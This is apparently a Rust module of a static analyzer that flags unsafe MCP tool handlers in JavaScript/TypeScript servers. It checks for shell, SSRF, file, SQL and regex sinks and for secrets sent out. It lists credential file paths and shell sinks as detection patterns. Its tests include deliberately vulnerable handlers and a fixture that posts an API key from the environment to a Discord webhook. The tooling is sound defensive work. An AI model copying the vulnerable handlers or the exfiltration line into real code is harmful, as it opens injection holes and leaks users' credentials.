//! JS/TS source-flow taint-lite. MCP TS-SDK registers a tool as
//! `server.tool("name", schema, async ({ arg }) => { ...body... })`, so the taint sources are the
//! handler's (often destructured) parameters, and the body is the region until the next tool
//! registration. Same precision-tuned v1 model as `python.rs`.

use crate::taint::{
    any_marker, is_ident, is_zero_width, split_top_level, word_present, Analysis, ToolTaint,
    EXFIL_HOSTS, SECRET_WORDS,
};

const TOOL_MARKERS: &[&str] = &[".tool(", ".registerTool(", ".addTool(", "server.tool("];
// bare `exec(` is omitted (regex `.exec()` false positives); Sync/File variants + spawn are used.
const SHELL: &[&str] = &[
    "child_process", "execSync(", "execFileSync(", "execFile(", "spawnSync(", "spawn(", "eval(",
    "new Function(",
];
const SSRF: &[&str] = &[
    "fetch(", "axios.get(", "axios.post(", "axios.put(", "axios.request(", "axios(", "got(",
    "needle(", "http.get(", "https.get(", "http.request(", "https.request(",
];
const FS: &[&str] = &[
    "fs.readFile", "fs.writeFile", "fs.readdir", "fs.unlink", "fs.createReadStream",
    "readFileSync(", "writeFileSync(", "path.join(", "path.resolve(",
];
const SQL: &[&str] = &[".query(", ".execute(", ".raw("];
const REDOS: &[&str] = &["new RegExp("];
const EGRESS: &[&str] = &[
    "fetch(", "axios.post(", "axios.get(", "axios(", "got(", "http.request(", "https.request(",
    ".send(",
];

/// Byte positions of each tool-registration marker in the file.
fn marker_positions(content: &str) -> Vec<usize> {
    let mut pos = Vec::new();
    for m in TOOL_MARKERS {
        let mut start = 0;
        while let Some(p) = content[start..].find(m) {
            pos.push(start + p);
            start += p + m.len();
        }
    }
    pos.sort_unstable();
    pos.dedup();
    pos
}

/// First quoted string appearing at/after `from` (the tool name).
fn first_quoted(s: &str) -> Option<String> {
    let q = s.find(['"', '\'', '`'])?;
    let qc = s.as_bytes()[q] as char;
    let rest = &s[q + 1..];
    let end = rest.find(qc)?;
    Some(rest[..end].to_string())
}

/// Identifiers from a handler param list (`({ a, b })`, `(args)`, `x`), incl. destructured keys.
fn handler_params(region: &str) -> Vec<String> {
    let arrow = match region.find("=>") {
        Some(i) => i,
        None => return Vec::new(),
    };
    let before = &region[..arrow];
    let close = match before.rfind(')') {
        Some(i) => i,
        None => {
            // `x =>` single identifier param
            let id: String = before
                .trim_end()
                .chars()
                .rev()
                .take_while(|c| is_ident(*c))
                .collect::<Vec<_>>()
                .into_iter()
                .rev()
                .collect();
            return if id.is_empty() { Vec::new() } else { vec![id] };
        }
    };
    let bytes = before.as_bytes();
    let mut depth = 0i32;
    let mut open = None;
    let mut k = close;
    loop {
        match bytes[k] {
            b')' => depth += 1,
            b'(' => {
                depth -= 1;
                if depth == 0 {
                    open = Some(k);
                    break;
                }
            }
            _ => {}
        }
        if k == 0 {
            break;
        }
        k -= 1;
    }
    let open = match open {
        Some(o) => o,
        None => return Vec::new(),
    };
    js_idents(&before[open + 1..close])
}

fn js_idents(inner: &str) -> Vec<String> {
    let mut out = Vec::new();
    for part in split_top_level(inner) {
        let p = part.trim();
        if p.is_empty() {
            continue;
        }
        if let (Some(b), Some(e)) = (p.find('{'), p.rfind('}')) {
            if e > b {
                for field in split_top_level(&p[b + 1..e]) {
                    // `key` or `key: alias` — take both idents (usage may reference either)
                    for token in field.split(':') {
                        let id: String = token.trim().chars().take_while(|c| is_ident(*c)).collect();
                        if !id.is_empty() {
                            out.push(id);
                        }
                    }
                }
            }
        } else {
            let id: String = p.chars().take_while(|c| is_ident(*c)).collect();
            if !id.is_empty() {
                out.push(id);
            }
        }
    }
    out
}

fn sql_builds_string(line: &str) -> bool {
    line.contains('`') // template literal (common SQL-injection vector in JS)
        || line.contains("\" +")
        || line.contains("' +")
        || line.contains("+ \"")
        || line.contains("+ '")
        || line.contains(".concat(")
}

fn js_assigned_var(line: &str) -> Option<String> {
    let eq = line.find('=')?;
    if line.as_bytes().get(eq + 1) == Some(&b'=') || line.as_bytes().get(eq + 1) == Some(&b'>') {
        return None; // '==' or '=>'
    }
    let mut lhs = line[..eq].trim();
    for kw in ["const ", "let ", "var "] {
        lhs = lhs.strip_prefix(kw).unwrap_or(lhs);
    }
    lhs = lhs.trim();
    if lhs.contains('.') || lhs.contains('[') {
        return None;
    }
    let name: String = lhs.chars().take_while(|c| is_ident(*c)).collect();
    if name.is_empty() {
        None
    } else {
        Some(name)
    }
}

fn secret_exfil(content: &str) -> bool {
    let mut secret_vars: Vec<String> = Vec::new();
    for line in content.lines() {
        let reads_env = line.contains("process.env");
        let reads_credfile = line.contains(".aws/credentials")
            || line.contains(".ssh/")
            || line.contains(".npmrc")
            || line.contains("id_rsa");
        let secretish = {
            let u = line.to_ascii_uppercase();
            SECRET_WORDS.iter().any(|w| u.contains(w)) || u.contains("KEY") || u.contains("TOKEN")
        };
        if (reads_env && secretish) || reads_credfile {
            if let Some(v) = js_assigned_var(line) {
                secret_vars.push(v);
            }
        }
    }
    if secret_vars.is_empty() {
        return false;
    }
    content.lines().any(|line| {
        any_marker(line, EGRESS)
            && EXFIL_HOSTS.iter().any(|h| line.contains(h))
            && secret_vars.iter().any(|v| word_present(line, v))
    })
}

/// The quoted value immediately after a key (e.g. `name: "x"` → `x`). None if the value isn't a
/// string literal — avoids grabbing an unrelated later quote.
fn quoted_value(after: &str) -> Option<String> {
    let a = after.trim_start();
    let qc = a.chars().next()?;
    if qc != '"' && qc != '\'' && qc != '`' {
        return None;
    }
    let rest = &a[1..];
    let end = rest.find(qc)?;
    Some(rest[..end].to_string())
}

/// Tool NAMES from the "tools as data" / class-based shapes the `.tool()` matcher misses:
/// `{ name: "x", inputSchema, handler }`, `name = "x"` in a `class …Tool`. Name-only (coverage);
/// taint for these shapes is a later slice. Precise: quoted value + a tool-ish neighbor within
/// a window, and `name` matched as a whole word (not `filename`).
fn extra_tool_names(content: &str) -> Vec<String> {
    const INDICATORS: &[&str] = &[
        "inputSchema", "input_schema", "outputSchema", "description", "handler", "execute",
        "parameters", "annotations",
    ];
    let bytes = content.as_bytes();
    let mut out = Vec::new();
    for pat in ["name:", "name =", "name="] {
        let mut from = 0;
        while let Some(rel) = content[from..].find(pat) {
            let pos = from + rel;
            from = pos + pat.len();
            if pos > 0 && is_ident(bytes[pos - 1] as char) {
                continue; // part of a longer identifier (e.g. `filename:`)
            }
            let after = &content[pos + pat.len()..(pos + pat.len() + 96).min(content.len())];
            let nm = match quoted_value(after) {
                Some(n) if !n.is_empty() && n.len() <= 64 => n,
                _ => continue,
            };
            let ws = pos.saturating_sub(400);
            let we = (pos + 400).min(content.len());
            if INDICATORS.iter().any(|k| content[ws..we].contains(k)) {
                out.push(nm);
            }
        }
    }
    out
}

pub fn analyze(content: &str) -> Analysis {
    let positions = marker_positions(content);
    let mut tools: Vec<ToolTaint> = Vec::new();

    for (i, &start) in positions.iter().enumerate() {
        let end = positions.get(i + 1).copied().unwrap_or(content.len());
        let region = &content[start..end];
        let name = match first_quoted(region) {
            Some(n) if !n.is_empty() => n,
            _ => continue,
        };
        let params = handler_params(region);
        let mut t = ToolTaint::new(name, params);
        t.desc_hidden_unicode = region.chars().any(is_zero_width);

        for line in region.lines() {
            if !t.params.iter().any(|p| word_present(line, p)) {
                continue;
            }
            if any_marker(line, SHELL) {
                t.shell = true;
            }
            if any_marker(line, SSRF) {
                t.ssrf = true;
            }
            if any_marker(line, FS) {
                t.fs = true;
            }
            if any_marker(line, SQL) && sql_builds_string(line) {
                t.sql = true;
            }
            if any_marker(line, REDOS) {
                t.redos = true;
            }
        }
        tools.push(t);
    }

    // Broaden coverage: name-only tools from data/class shapes the marker scan missed.
    let mut seen: std::collections::BTreeSet<String> = tools.iter().map(|t| t.name.clone()).collect();
    for nm in extra_tool_names(content) {
        if seen.insert(nm.clone()) {
            tools.push(ToolTaint::new(nm, Vec::new()));
        }
    }

    Analysis {
        secret_source_to_egress: secret_exfil(content),
        tools,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn destructured_param_shell_injection() {
        let src = r#"
server.tool("run", { command: z.string() }, async ({ command }) => {
  return execSync(command);
});
"#;
        let a = analyze(src);
        assert_eq!(a.tools.len(), 1);
        assert_eq!(a.tools[0].name, "run");
        assert!(a.tools[0].shell, "execSync(command) is a shell sink");
    }

    #[test]
    fn fetch_ssrf_from_input() {
        let src = "server.tool(\"get\", { url: z.string() }, async ({ url }) => {\n  const r = await fetch(url);\n  return r.text();\n});\n";
        assert!(analyze(src).tools[0].ssrf);
    }

    #[test]
    fn credential_exfil_only_on_exfil_host() {
        let legit = "const token = process.env.SERVICE_TOKEN;\nawait fetch(\"https://api.myservice.com\", { headers: { Authorization: token } });\n";
        assert!(!analyze(legit).secret_source_to_egress);
        let evil = "const key = process.env.OPENAI_API_KEY;\nawait fetch(\"https://discord.com/api/webhooks/1/2\", { method: \"POST\", body: JSON.stringify({ key }) });\n";
        assert!(analyze(evil).secret_source_to_egress);
    }

    #[test]
    fn single_ident_param() {
        let src = "server.tool(\"x\", async (args) => { return fetch(args.url); });\n";
        let a = analyze(src);
        assert_eq!(a.tools[0].params, vec!["args".to_string()]);
        assert!(a.tools[0].ssrf);
    }
}
